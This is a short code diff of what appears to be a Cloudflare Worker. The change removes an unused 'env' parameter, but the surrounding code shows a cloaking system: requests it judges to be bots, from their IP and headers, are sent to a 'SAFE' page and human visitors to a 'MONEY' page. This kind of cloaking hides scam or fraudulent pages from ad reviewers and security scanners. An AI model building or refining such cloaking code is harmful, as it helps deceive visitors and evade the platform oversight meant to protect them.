@@ -781,10 +781,10 @@ const requestTracker = new Map();
 // --- END CONFIGURATION ---
 
 addEventListener('fetch', event => {
-  event.respondWith(handleRequest(event.request, event.env));
+  event.respondWith(handleRequest(event.request));
 });
 
-async function handleRequest(request, env) {
+async function handleRequest(request) {
   const url = new URL(request.url);
 
   // ROUTE 1: Serve the advanced service worker with comprehensive blocking
@@ -881,12 +881,12 @@ async function handleRequest(request, env) {
   }
   
   // ROUTE 3: Handle the initial page load with cloaking logic.
-  return handleMainRequest(request, env);
+  return handleMainRequest(request);
 }
 
 // --- CORE FUNCTIONS ---
 
-async function isVisitorABot(request, env) {
+async function isVisitorABot(request) {
   const clientIP = request.headers.get('CF-Connecting-IP') || '127.0.0.1';
   const userAgent = request.headers.get('User-Agent') || '';
   const acceptHeader = request.headers.get('Accept') || '';
@@ -1002,12 +1002,12 @@ async function isVisitorABot(request, env) {
   }
 }
 
-async function handleMainRequest(request, env) {
+async function handleMainRequest(request) {
   const requestUrl = new URL(request.url);
   const clientIP = request.headers.get('CF-Connecting-IP') || 'unknown';
   
   try {
-    const isBot = await isVisitorABot(request, env);
+    const isBot = await isVisitorABot(request);
     const targetUrl = isBot ? SAFE_URL : MONEY_URL;
     
     console.log('Routing to:', isBot ? 'SAFE' : 'MONEY', 'page for IP:', clientIP);
